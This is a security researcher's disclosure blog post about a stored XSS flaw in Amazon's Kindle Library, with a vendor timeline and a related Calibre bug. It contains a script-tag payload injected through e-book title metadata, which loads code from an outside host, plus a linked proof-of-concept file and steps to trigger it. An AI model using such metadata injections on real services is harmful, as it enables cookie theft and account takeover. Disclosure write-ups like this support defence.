---
layout: post
published: true
#redirect_from: /2014/09/amazon-stored-xss-book-metadata.html
title: "Amazon.com Stored XSS via Book Metadata"
tags: amazon,web,xss
category: Vulnerabilities
excerpt: "I have found a Stored Cross-Site Scripting (XSS) vulnerability on Amazon.com. This post explains the issue and describes a possible venue of exploitation."
image:
  feature: banner-amazon2.jpg
---
[img1]: /images/ie-kindlelib-amzCOM.png
{: height="50%" width="50%"}
[img2]: /images/2014-reintrot.png
{: height="50%" width="50%"}
[img3]: /images/calibre.png
{: height="50%" width="50%"}

**Amazon's Kindle Library**, also known as "Manage Your Content and Devices" and "Manage your Kindle", **is, at the time of writing, vulnerable to Stored Cross-Site Scripting (XSS) attacks**. (Update 2014-09-16: After I had published my findings, Amazon fixed the issue.) Malicious code can be injected via e-book metadata; for example, an e-book's title.

Once an attacker manages to have an e-book (file, document, ...) with a title like 

{% highlight html %}
<script src="https://www.example.org/script.js"></script>
{% endhighlight %}

added to the victim's library, the code will be executed as soon as the victim opens the Kindle Library web page. As a result, Amazon account cookies can be accessed by and transferred to the attacker and the victim's Amazon account can be compromised.

<!--more-->

<figure>
	<a href="/images/ie-kindlelib-amzCOM.png"><img src="/images/ie-kindlelib-amzCOM.png"></a>
</figure>

## Who is affected?

Basically, everyone who uses Amazon's Kindle Library to store e-books or to deliver them to a Kindle.

However, users most likely to fall victim to this vulnerability are those who obtain e-books from untrustworthy sources (read: pirated e-books) and then use Amazon's "Send to Kindle" service to have them delivered to their Kindle. From the supplier's point of view, vulnerabilities like this present an opportunity to gain access to active Amazon accounts.

Users who stick to e-books sold and delivered by Amazon should be safe, unless there's another oversight on Amazon's part, such as the one described here: <http://drwetter.eu/amazon/>

## Proof of Concept & Demonstration

A Proof of Concept (PoC) file can be downloaded from <https://fl7.de/pub/2014/amazon-mobixss/pub.mobi>; its title metadata contains the classic "&lt;script&gt;alert('xss')</script>" payload. Simply send it to your "Send to Kindle" email address and browse to your Kindle Library page at <https://www.amazon.com/mn/dcw/myx.html#/home/content/pdocs/dateDsc/>. Depending on whether the file was already delivered to your Kindle or not, you may have to select "Pending Deliveries" from the drop-down box below the "Your Content" tab.   
   
    
And this is what it looks like:

<figure>
	<a href="/images/2014-reintrot.png"><img src="/images/2014-reintrot.png"></a>
</figure>


You can remove the file from your library as soon as it has been delivered to your Kindle, and while doing so you will notice about half a dozen additional alert boxes.

## History, Response

When I first reported this vulnerability to Amazon in November 2013, my initial Proof of Concept, a MOBI e-book with a title similar to the one mentioned above, contained code to collect cookies and send them to me. Interestingly, Amazon's Information Security team continued to use this PoC on internal preproduction systems for months after the vulnerability had been fixed. This made it even more surprising that, when rolling out a new version of the "Manage your Kindle" web application, Amazon reintroduced this very vulnerability.

Amazon chose not to respond to my subsequent email detailing the issue, and two months later, the vulnerability remains unfixed.

## Not Just Amazon

You may be thinking that XSS-inducing metadata in e-books doesn't affect you simply because you are organizing your e-books not through a web interface, but with Calibre <http://calibre-ebook.com/>. Well, have a look at this:

<figure>
	<a href="/images/calibre.png"><img src="/images/calibre.png"></a>
</figure>
 
Calibre's developer, Kovid Goyal, acknowledged the problem less than four hours after I had reported it (<https://bugs.launchpad.net/calibre/+bug/1243976>), and a new release - version 1.8.0 - including a bugfix was made available the following day. This is quite an impressive response (time), even more so when you consider that Calibre is maintained by an individual who makes this software available at no cost. If you are a frequent Calibre user, consider making a donation!
 
## Timeline

2013-10-24 Vulnerability discovered.  
2013-11-15 Vulnerability reported to security@amazon.com.  
2013-11-19 Amazon.com Information Security assigns case number.  
2013-12-06 Reported vulnerability fixed.  
2014-??-?? Vulnerability reintroduced by "Manage Your Kindle" web page redesign.  
2014-07-09 Vulnerability reported to security@amazon.com.  
2014-09-12 (Still no response from Amazon. Public disclosure.)  
2014-09-16 Reported vulnerability fixed.  

